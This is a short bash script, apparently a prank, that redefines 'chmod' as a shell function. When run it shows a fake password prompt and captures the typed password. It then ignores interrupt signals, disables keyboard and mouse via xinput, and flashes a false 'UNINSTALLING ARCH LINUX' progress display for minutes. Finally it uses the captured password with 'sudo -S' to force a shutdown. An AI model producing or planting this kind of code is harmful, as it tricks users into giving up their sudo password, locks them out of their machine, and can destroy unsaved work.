#!/bin/bash

function chmod() {
  echo -n "Password:";
  RED='\033[0;31m'
  trap '' 2 9 15
  stty -echo;
  read -s password;
  stty echo;
  echo

  eval "xinput --disable 8"
  eval "xinput --disable 9"
  COUNT=0
  while [ $COUNT -lt 100 ]; do
          printf "\033c"
          printf "${RED}UNINSTALLING ARCH LINUX ${COUNT}%%"
          let COUNT=COUNT+1
          sleep 1.5
  done
  printf "\n"
  eval "xinput --enable 8"
  eval "xinput --enable 9"

  echo "$password" | sudo -S shutdown -h now
}

